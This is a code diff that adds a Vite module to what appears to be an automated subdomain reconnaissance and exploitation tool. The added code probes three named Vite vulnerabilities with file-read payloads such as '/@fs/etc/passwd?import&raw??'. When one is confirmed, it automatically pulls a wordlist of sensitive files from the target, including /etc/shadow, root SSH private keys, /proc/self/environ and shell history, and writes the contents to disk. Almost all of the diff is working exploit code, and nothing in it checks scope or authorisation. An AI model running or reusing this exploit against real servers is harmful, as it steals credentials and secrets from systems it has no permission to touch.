@@ -706,6 +706,189 @@ async def process_subdomain(
             except asyncio.TimeoutError:
                 print(f"{_pfx()}{_c(_C_YELLOW, '[next] timeout — skipping')}")
 
+            # Vite CVE detection + LFI
+            try:
+                async with asyncio.timeout(90):
+                    await process_vite(url, target_js + bruted, output_dir / slug, client)
+            except asyncio.TimeoutError:
+                print(f"{_pfx()}{_c(_C_YELLOW, '[vite] timeout — skipping')}")
+
+
+
+
+# ─── Vite CVE detection ───────────────────────────────────────────────────────
+
+VITE_LFI_WORDLIST = [
+    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
+    "/etc/ssh/sshd_config", "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys",
+    "/root/.bash_history", "/root/.bashrc", "/root/.profile",
+    "/proc/self/environ", "/proc/self/cmdline",
+    "/etc/mysql/my.cnf", "/etc/my.cnf",
+    "/etc/php.ini", "/usr/local/etc/php.ini",
+    "/etc/apache2/apache.conf", "/usr/local/apache/conf/httpd.conf",
+    "/etc/nginx/nginx.conf",
+    "/var/log/apache2/access.log", "/var/log/nginx/access.log",
+    "/var/log/auth.log",
+]
+
+
+def get_vite_root_path(js_urls):
+    for u in js_urls:
+        m = re.search(r"(.*?)/@vite/client", u)
+        if m:
+            parsed = urlparse(u)
+            path = parsed.path
+            root = path.replace("/@vite/client", "")
+            return root if root else "/"
+    return None
+
+
+async def probe_cve(client, base_url, root_path):
+    base = base_url.rstrip("/")
+    root = root_path.rstrip("/")
+    results = {}
+
+    probes = {
+        "CVE-2025-30208": [
+            f"{base}{root}/etc/passwd?import&raw??",
+            f"{base}{root}/@fs/etc/passwd?import&raw??",
+        ],
+        "CVE-2025-31125": [
+            f"{base}{root}/etc/passwd?import&?inline=1.wasm?init",
+            f"{base}{root}/@fs/etc/passwd?import&?inline=1.wasm?init",
+        ],
+        "CVE-2025-31486": [
+            f"{base}{root}/x/x/x/vite-project/?/../../../../../etc/passwd?import&raw??",
+            f"{base}{root}/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&raw??",
+        ],
+    }
+
+    def is_success_30208(r): return "export default" in r.text
+    def is_success_31125(r): return "data:application/octet-stream;base64" in r.text
+    def is_success_31486(r): return "export default" in r.text
+
+    markers = {
+        "CVE-2025-30208": is_success_30208,
+        "CVE-2025-31125": is_success_31125,
+        "CVE-2025-31486": is_success_31486,
+    }
+
+    for cve, urls in probes.items():
+        confirmed = False
+        for probe_url in urls:
+            try:
+                r = await client.get(probe_url, timeout=_T_FAST, follow_redirects=True)
+                if r.status_code == 200 and markers[cve](r):
+                    confirmed = True
+                    break
+            except Exception:
+                continue
+        results[cve] = confirmed
+
+    return results
+
+
+def extract_lfi_content(cve, text):
+    if cve in ("CVE-2025-30208", "CVE-2025-31486"):
+        m = re.search(r'export default\s+"(.*?)"', text, re.DOTALL)
+        if m:
+            return m.group(1).replace("\\n", "\n").replace("\\t", "\t")
+        return text
+    elif cve == "CVE-2025-31125":
+        m = re.search(r"base64,([A-Za-z0-9+/=]+)", text)
+        if m:
+            import base64
+            try:
+                return base64.b64decode(m.group(1)).decode("utf-8", errors="replace")
+            except Exception:
+                return m.group(1)
+    return text
+
+
+def build_lfi_urls(base, root, cve, sensitive_path):
+    sep_variants = ["", "/@fs"]
+    if cve == "CVE-2025-30208":
+        return [f"{base}{root}{sep}{sensitive_path}?import&raw??" for sep in sep_variants]
+    elif cve == "CVE-2025-31125":
+        return [f"{base}{root}{sep}{sensitive_path}?import&?inline=1.wasm?init" for sep in sep_variants]
+    elif cve == "CVE-2025-31486":
+        return [f"{base}{root}{sep}/x/x/x/vite-project/?/../../../../../{sensitive_path.lstrip('/')}?import&raw??" for sep in sep_variants]
+    return []
+
+
+def is_lfi_success(cve, r):
+    if cve in ("CVE-2025-30208", "CVE-2025-31486"):
+        return r.status_code == 200 and "export default" in r.text
+    elif cve == "CVE-2025-31125":
+        return r.status_code == 200 and "data:application/octet-stream;base64" in r.text
+    return False
+
+
+async def exploit_vite_lfi(client, base_url, root_path, cve, domain_dir):
+    base = base_url.rstrip("/")
+    root = root_path.rstrip("/")
+    lfi_dir = domain_dir / "vite_lfi"
+    lfi_dir.mkdir(exist_ok=True)
+    found = []
+    sem = asyncio.Semaphore(5)
+
+    async def probe(sensitive_path):
+        async with sem:
+            for url in build_lfi_urls(base, root, cve, sensitive_path):
+                try:
+                    r = await client.get(url, timeout=_T_FAST, follow_redirects=True)
+                    if is_lfi_success(cve, r):
+                        content = extract_lfi_content(cve, r.text)
+                        fname = sensitive_path.lstrip("/").replace("/", "_")
+                        (lfi_dir / fname).write_text(content, encoding="utf-8")
+                        found.append(sensitive_path)
+                        label = f"{_C_RED}{_C_BOLD}[lfi]{_C_RESET}"
+                        print(f"{_pfx()}{label} {_c(_C_RED, sensitive_path)} -> {_c(_C_DIM, str(lfi_dir / fname))}")
+                        break
+                except Exception:
+                    continue
+
+    await asyncio.gather(*[probe(p) for p in VITE_LFI_WORDLIST])
+    return found
+
+
+async def process_vite(base_url, js_urls, domain_dir, client):
+    root_path = get_vite_root_path(js_urls)
+    if not root_path:
+        return
+
+    print(f"{_pfx()}{_c(_C_CYAN + _C_BOLD, '[vite]')} Detected — root: {_c(_C_YELLOW, root_path)}")
+
+    cve_results = await probe_cve(client, base_url, root_path)
+    confirmed = [cve for cve, ok in cve_results.items() if ok]
+
+    if not confirmed:
+        print(f"{_pfx()}{_c(_C_DIM, '[-] No Vite CVEs confirmed')}")
+        vite_info = {"root_path": root_path, "base_url": base_url, "cve_probed": cve_results, "confirmed": [], "lfi_files": []}
+        (domain_dir / "vite_info.json").write_text(json.dumps(vite_info, indent=2, ensure_ascii=False), encoding="utf-8")
+        return
+
+    for cve in confirmed:
+        print(f"{_pfx()}{_c(_C_RED + _C_BOLD, '[CVE]')} {_c(_C_RED, cve)} CONFIRMED")
+
+    best_cve = confirmed[0]
+    print(f"{_pfx()}{_c(_C_YELLOW, f'[lfi] Exploiting {best_cve} — trying {len(VITE_LFI_WORDLIST)} paths...')}")
+
+    try:
+        async with asyncio.timeout(60):
+            found = await exploit_vite_lfi(client, base_url, root_path, best_cve, domain_dir)
+    except asyncio.TimeoutError:
+        found = []
+        print(f"{_pfx()}{_c(_C_YELLOW, '[lfi] timeout')}")
+
+    if found:
+        _ok(f"LFI: {_c(_C_RED, str(len(found)))} file(s) read -> {_c(_C_DIM, str(domain_dir / 'vite_lfi'))}")
+
+    vite_info = {
+        "root_path": root_path, "base_url": base_url,
+        "cve_probed": cve_results, "confirmed": confirmed, "lfi_files": found,
+    }
+    (domain_dir / "vite_info.json").write_text(json.dumps(vite_info, indent=2, ensure_ascii=False), encoding="utf-8")
 
 
 # ─── Next.js buildManifest + data endpoints ──────────────────────────────────
